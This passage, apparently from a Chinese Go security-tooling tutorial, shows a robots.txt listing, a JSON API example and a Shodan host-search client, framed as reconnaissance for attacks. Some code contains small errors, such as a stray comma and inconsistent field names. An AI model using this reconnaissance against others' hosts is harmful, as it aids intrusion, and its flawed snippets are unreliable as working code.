class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: ChinasoSpider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sosospider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: yisouspider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: EasouSpider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure><p>如果需要解析更多的结构化数据，如<code>JSON</code>格式的数据进行<code>API</code>交互，则可以使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Status <span class="keyword">struct</span> &#123;</span><br><span class="line">Message <span class="type">string</span></span><br><span class="line">Status <span class="type">string</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">res,err := http.Post(</span><br><span class="line"><span class="string">&quot;http://IP:PORT/API&quot;</span>,</span><br><span class="line"><span class="string">&quot;application/json&quot;</span>,</span><br><span class="line"><span class="literal">nil</span>,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> status Status</span><br><span class="line"><span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;status);err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">log.Printf(<span class="string">&quot;%s-&gt;%s\n&quot;</span>,status.Status,status.Message)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0X02-构建与Shodan交互的HTTP客户端"><a href="#0X02-构建与Shodan交互的HTTP客户端" class="headerlink" title="0X02 构建与Shodan交互的HTTP客户端"></a>0X02 构建与Shodan交互的HTTP客户端</h2><p>当一个泄露的错误消息的web应用会被列入低危险等级，但是，如果错误消息泄露了企业用户的格式，并且其VPN内使用了单因素身份认证，则这些消息可能会增加通过猜测密码攻击内部网络的可能性</p><p>以<code>Shodan</code>为例子,需要一个<code>Shodan</code>的<code>api密钥</code>。</p><p>从Shodan 站点获取 API 密钥并将其设为环境变量，仅当API密钥为<code>SHODAN_API_KEY</code>的时候，下面示例才能正常工作</p><p><code>SHODAN API</code>非常简单，可以生成良好的<code>JSON</code>响应，对初学者学习<code>API</code>交互很有帮助，以下是步骤</p><ol><li>查看服务的<code>API</code>文档</li><li>设计代码的逻辑结构，以减少代码的复杂性和复用性</li><li>根据需要在<code>Go</code> 中定义请求或者响应类型。</li><li>创建辅助函数或者类型以简化初始化，身份认证和通信，从而减少冗长或者复杂的逻辑</li><li>构建与<code>API</code>消费者函数和类型交互的客户端</li></ol><h3 id="1-清理API调用"><a href="#1-清理API调用" class="headerlink" title="1. 清理API调用"></a>1. 清理API调用</h3><p>在阅读<code>SHODAN</code>文档的时候，你应该已经注意到：每个公开的函数都需要发送<code>API密钥</code>，尽管这个值传递给你所创建的每个消费者函数，但这么操作会非常繁琐。硬编码处理基础<code>https://api.shodan.io</code>也会遇到相同的问题，如下面函数所示，要定义API函数，需要将令牌和URL一起传递给每个函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">APIInfo</span><span class="params">(token, url <span class="type">string</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HostSearch</span><span class="params">(token, url <span class="type">string</span>)</span></span></span><br></pre></td></tr></table></figure><p>因此，我们选择一种更为常用的方法，先创建一个<code>shodan.go</code>文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Shodan</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> BaseURL = <span class="string">&quot;http://api.shodan.io&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Client <span class="keyword">struct</span> &#123;</span><br><span class="line">apiKey <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(apikey <span class="type">string</span>)</span></span> *Client  &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;Client&#123;apikey: apikey&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Shodan URL 被定义为一个常见值，这样我们在实现函数中重用它，</p><p>由于这些是结构体<code>Client</code>上的方法，因此可以通过<code>s.apiKey</code>去检索<code>API</code>密钥，并且通过<code>BaseURL</code>去检索<code>URL</code></p><h3 id="2-查询Shodan-订阅情况"><a href="#2-查询Shodan-订阅情况" class="headerlink" title="2. 查询Shodan 订阅情况"></a>2. 查询Shodan 订阅情况</h3><p>现在，开始与<code>Shodan</code>进行互动，根据<code>API</code>文档，用于查询信息的调用如下</p><blockquote><p>shodan 文档：<a href="https://developer.shodan.io/api">https://developer.shodan.io/api</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.shodan.io/api-info?key=&#123;YOUR_API_KEY&#125;</span><br></pre></td></tr></table></figure><p>返回信息是如下的格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;scan_credits&quot;</span><span class="punctuation">:</span> <span class="number">100000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;usage_limits&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;scan_credits&quot;</span><span class="punctuation">:</span> <span class="number">-1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;query_credits&quot;</span><span class="punctuation">:</span> <span class="number">-1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;monitored_ips&quot;</span><span class="punctuation">:</span> <span class="number">-1</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stream-100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;https&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;unlocked&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;query_credits&quot;</span><span class="punctuation">:</span> <span class="number">100000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;monitored_ips&quot;</span><span class="punctuation">:</span> <span class="number">19</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;unlocked_left&quot;</span><span class="punctuation">:</span> <span class="number">100000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;telnet&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>我们首先需要在<code>api.go</code>中定义一个可用于把<code>json</code>响应解组为<code>go</code>结构体的类型，如果缺少这一步，将无法处理或者访问响应正文。</p><p>新建<code>api.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Shodan</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> APIInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">QueryCredits <span class="type">int</span>    <span class="string">`json:&quot;query_credits&quot;`</span></span><br><span class="line">ScanCredits  <span class="type">int</span>    <span class="string">`json:&quot;scan_credits&quot;`</span></span><br><span class="line">Telnet       <span class="type">bool</span>   <span class="string">`json:&quot;telnet&quot;`</span></span><br><span class="line">Plan         <span class="type">string</span> <span class="string">`json:&quot;plan&quot;`</span></span><br><span class="line">Https        <span class="type">bool</span>   <span class="string">`json:&quot;https&quot;`</span></span><br><span class="line">Unlocked     <span class="type">bool</span>   <span class="string">`json:&quot;unlocked&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Client)</span></span>APIInfo()(*APIInfo, <span class="type">error</span>)  &#123;</span><br><span class="line">res,err := http.Get(fmt.Sprintf(<span class="string">&quot;%s/api-info?key=%s&quot;</span>,BaseURL,s.apikey))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>,err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ret  APIInfo;</span><br><span class="line"><span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;ret);err != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>,err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;ret,<span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用结构体数据显式调用<code>json</code>元素名称，以确保映射和解析数据</p><p>同时<code>APIInfo</code>发出HTTP的<code>Get</code>请求，，并将响应解码成<code>APIInfo</code>的结构体</p><p>我们在使用这段代码前，还需要使用一个有用的<code>API</code>调用(主机搜索)，将其添加到<code>host.go</code>文件中。</p><blockquote><p>根据API文档，该调用的请求和响应如下</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//api.shodan.io/shodan/host/search?key=&#123;YOUR_API_KEY&#125;&amp;query=&#123;query&#125;&amp;facets=&#123;facets&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">----有删减--------</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;matches&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;product&quot;</span>: <span class="string">&quot;nginx&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hash&quot;</span>: <span class="number">-1609083510</span>,</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: <span class="number">1616761883</span>,</span><br><span class="line">            <span class="string">&quot;org&quot;</span>: <span class="string">&quot;Comcast Business&quot;</span>,</span><br><span class="line">            <span class="string">&quot;isp&quot;</span>: <span class="string">&quot;Comcast Business&quot;</span>,</span><br><span class="line">            <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;tcp&quot;</span>,</span><br><span class="line">            <span class="string">&quot;cpe&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;cpe:/a:igor_sysoev:nginx&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;data&quot;</span>: <span class="string">&quot;HTTP/1.1 400 Bad Request\r\nServer: nginx\r\nDate: Mon, 25 Jan 2021 21:33:48 GMT\r\nContent-Type: text/html\r\nContent-Length: 650\r\nConnection: close\r\n\r\n&quot;</span>,</span><br><span class="line">            <span class="string">&quot;asn&quot;</span>: <span class="string">&quot;AS7922&quot;</span>,</span><br><span class="line">            <span class="string">&quot;port&quot;</span>: <span class="number">443</span>,</span><br><span class="line">            <span class="string">&quot;hostnames&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;three.webapplify.net&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;location&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;city&quot;</span>: <span class="string">&quot;Denver&quot;</span>,</span><br><span class="line">                <span class="string">&quot;region_code&quot;</span>: <span class="string">&quot;CO&quot;</span>,</span><br><span class="line">                <span class="string">&quot;area_code&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;longitude&quot;</span>: <span class="number">-104.9078</span>,</span><br><span class="line">                <span class="string">&quot;country_code3&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;latitude&quot;</span>: <span class="number">39.7301</span>,</span><br><span class="line">                <span class="string">&quot;postal_code&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;dma_code&quot;</span>: <span class="number">751</span>,</span><br><span class="line">                <span class="string">&quot;country_code&quot;</span>: <span class="string">&quot;US&quot;</span>,</span><br><span class="line">                <span class="string">&quot;country_name&quot;</span>: <span class="string">&quot;United States&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2021-01-25T21:33:49.154513&quot;</span>,</span><br><span class="line">            <span class="string">&quot;domains&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;webapplify.net&quot;</span></span><br><span class="line">            ],</span><br><span class="line">         </span><br><span class="line">            <span class="string">&quot;http&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;robots_hash&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;redirects&quot;</span>: [],</span><br><span class="line">                <span class="string">&quot;securitytxt&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;title&quot;</span>: <span class="string">&quot;410 Gone&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sitemap_hash&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;robots&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;server&quot;</span>: <span class="string">&quot;nginx/1.4.2&quot;</span>,</span><br><span class="line">                <span class="string">&quot;host&quot;</span>: <span class="string">&quot;185.11.246.51&quot;</span>,</span><br><span class="line">                <span class="string">&quot;html&quot;</span>: <span class="string">&quot;\n\n410 Gone\n\nGone\nThe requested resource/\nis no longer available on this server and there is no forwarding address.\nPlease remove all references to this resource.\n\n&quot;</span>,</span><br><span class="line">                <span class="string">&quot;location&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">                <span class="string">&quot;components&quot;</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">&quot;securitytxt_hash&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;sitemap&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;html_hash&quot;</span>: <span class="number">922034037</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;os&quot;</span>: null,</span><br><span class="line">            <span class="string">&quot;_shodan&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;crawler&quot;</span>: <span class="string">&quot;c9b639b99e5410a46f656e1508a68f1e6e5d6f99&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ptr&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: <span class="string">&quot;118b7360-01d0-4edb-8ee9-01e411c23e60&quot;</span>,</span><br><span class="line">                <span class="string">&quot;module&quot;</span>: <span class="string">&quot;auto&quot;</span>,</span><br><span class="line">                <span class="string">&quot;options&quot;</span>: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;ip_str&quot;</span>: <span class="string">&quot;185.11.246.51&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        ...</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;facets&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;country&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="string">&quot;count&quot;</span>: <span class="number">1717359</span>,</span><br><span class="line">                <span class="string">&quot;value&quot;</span>: <span class="string">&quot;HK&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;count&quot;</span>: <span class="number">940900</span>,</span><br><span class="line">                <span class="string">&quot;value&quot;</span>: <span class="string">&quot;FR&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;total&quot;</span>: <span class="number">23047224</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的代码是</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Shodan</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HostLocation <span class="keyword">struct</span> &#123;</span><br><span class="line">City         <span class="type">string</span>  <span class="string">`json:&quot;city&quot;`</span></span><br><span class="line">RegionCode   <span class="type">string</span>  <span class="string">`json:&quot;region_code&quot;`</span></span><br><span class="line">AreaCode     <span class="type">int</span>     <span class="string">`json:&quot;area_code&quot;`</span></span><br><span class="line">Longitude    <span class="type">float32</span> <span class="string">`json:&quot;longitude&quot;`</span></span><br><span class="line">CountryCode3 <span class="type">string</span>  <span class="string">`json:&quot;country_code3&quot;`</span></span><br><span class="line">CountryName  <span class="type">string</span>  <span class="string">`json:&quot;country_name&quot;`</span></span><br><span class="line">PostalCode   <span class="type">string</span>  <span class="string">`json:&quot;postal_code&quot;`</span></span><br><span class="line">DMACode      <span class="type">int</span>     <span class="string">`json:&quot;dma_code&quot;`</span></span><br><span class="line">CountryCode  <span class="type">string</span>  <span class="string">`json:&quot;country_code&quot;`</span></span><br><span class="line">Latitude     <span class="type">float32</span> <span class="string">`json:&quot;latitude&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Host <span class="keyword">struct</span> &#123;</span><br><span class="line">OS        <span class="type">string</span>       <span class="string">`json:&quot;os&quot;`</span></span><br><span class="line">Timestamp <span class="type">string</span>       <span class="string">`json:&quot;timestamp&quot;`</span></span><br><span class="line">ISP       <span class="type">string</span>       <span class="string">`json:&quot;isp&quot;`</span></span><br><span class="line">ASN       <span class="type">string</span>       <span class="string">`json:&quot;asn&quot;`</span></span><br><span class="line">Hostnames []<span class="type">string</span>     <span class="string">`json:&quot;hostnames&quot;`</span></span><br><span class="line">Location  HostLocation <span class="string">`json:&quot;location&quot;`</span></span><br><span class="line">IP        <span class="type">int64</span>        <span class="string">`json:&quot;ip&quot;`</span></span><br><span class="line">Domains   []<span class="type">string</span>     <span class="string">`json:&quot;domains&quot;`</span></span><br><span class="line">Org       <span class="type">string</span>       <span class="string">`json:&quot;org&quot;`</span></span><br><span class="line">Data      <span class="type">string</span>       <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">Port      <span class="type">int</span>          <span class="string">`json:&quot;port&quot;`</span></span><br><span class="line">IPString  <span class="type">string</span>       <span class="string">`json:&quot;ip_str&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HostSearch <span class="keyword">struct</span> &#123;</span><br><span class="line">Matches []Host <span class="string">`json:&quot;matches&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Client)</span></span> HostSearch(q <span class="type">string</span>) (*HostSearch, <span class="type">error</span>) &#123;</span><br><span class="line">res, err := http.Get(</span><br><span class="line">fmt.Sprintf(<span class="string">&quot;%s/shodan/host/search?key=%s&amp;query=%s&quot;</span>, BaseURL, s.apiKey, q),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> res.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ret HostSearch</span><br><span class="line"><span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;ret); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;ret, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>HostSearch：用于解析<code>matches</code>数组</li><li>Host：表示matches的一个元素</li><li>HostLocation：表示主机中的<code>location</code>字段</li></ul><p>接下来，我们创建main函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;Test1/Shodan&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">2</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Usage: main &lt;searchterm&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">apiKey := os.Getenv(<span class="string">&quot;SHODAN_API_KEY&quot;</span>)</span><br><span class="line">s := Shodan.New(apiKey)</span><br><span class="line">info, err := s.APIInfo()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(</span><br><span class="line"><span class="string">&quot;Query Credits: %d\nScan Credits:  %d\n\n&quot;</span>,</span><br><span class="line">info.QueryCredits,</span><br><span class="line">info.ScanCredits)</span><br><span class="line"></span><br><span class="line">hostSearch, err := s.HostSearch(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, host := <span class="keyword">range</span> 